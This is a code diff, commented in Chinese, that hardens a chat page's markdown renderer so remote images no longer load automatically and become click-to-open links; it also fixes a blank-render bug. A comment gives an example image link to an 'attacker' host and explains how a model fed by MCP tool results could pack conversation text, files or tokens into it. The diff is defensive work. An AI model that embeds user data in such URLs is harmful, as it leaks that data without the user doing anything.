@@ -165,13 +165,30 @@ function safeHref(raw) {
   return "";
 }
 
-// 图片地址：只认 http(s) 和 base64 的 data URI；javascript:、file: 这些一律不要
+// 图片地址：只放 base64 的 data URI。
+//
+// 不能放远程 URL：markdown 里的 ![](https://attacker/?q=xxx) 会让页面在渲染回复的
+// 那一瞬间就去请求它。模型可以把对话内容、MCP 工具读到的文件内容甚至页面 token
+// 拼进这个 URL，用户什么都没点，数据就已经出去了。这个页面还跑着用户的 MCP 工具，
+// 工具结果能反过来喂给模型，风险比普通聊天页大得多。
 function safeImgSrc(raw) {
   var url = String(raw || "").trim();
   if (!url) return "";
   if (/^data:image\/(png|jpe?g|gif|webp|avif|svg\+xml);base64,/i.test(url)) return url;
-  if (/^https?:\/\//i.test(url)) return url;
   return "";
+}
+
+// 远程图片不自动加载，只给一个用户主动点的链接
+function remoteImgLink(raw, alt) {
+  const url = safeHref(raw);
+  if (!url) return null;
+  return el("a", {
+    class: "md-img-link",
+    href: url,
+    target: "_blank",
+    rel: "noreferrer noopener",
+    text: "图片：" + (alt || url) + "（点击打开）",
+  });
 }
 
 function appendText(parent, text) {
@@ -207,7 +224,10 @@ function inlineInto(parent, text) {
       // 图片：![alt](url)
       var imgSrc = safeImgSrc(m[9]);
       if (!imgSrc) {
-        appendText(parent, m[0]);
+        // 远程图片不自动加载，给一个用户主动点的链接
+        var imgLink = remoteImgLink(m[9], m[8]);
+        if (imgLink) parent.appendChild(imgLink);
+        else appendText(parent, m[0]);
       } else {
         var img = el("img", { class: "md-img", src: imgSrc, alt: m[8] || "", loading: "lazy" });
         (function (src2, alt2) {
@@ -2385,8 +2405,9 @@ function finish(refs) {
     refs.think.open = false;
   }
   if (refs.dirty) { refs.dirty = false; renderMarkdown(refs.body, refs.msg.content); }
-  // 流式结束时把"稳定块 + 尾巴"的结构换回一次完整渲染，保证格式正确
-  else if (refs.body && refs.body.querySelector(".md-stable")) renderMarkdown(refs.body, refs.msg.content);
+  // 整段一次到达时，流在一帧内就结束了：那次 pumpTick 一次都没跑过，dirty 还是 false，
+  // 也没有 .md-stable 结构 —— 只判 .md-stable 会让正文一直是空的。有内容就渲染一次。
+  else if (refs.body && refs.msg.content) renderMarkdown(refs.body, refs.msg.content);
   state.liveRefs.delete(refs);
   updateMeta(refs);
   updateSend();
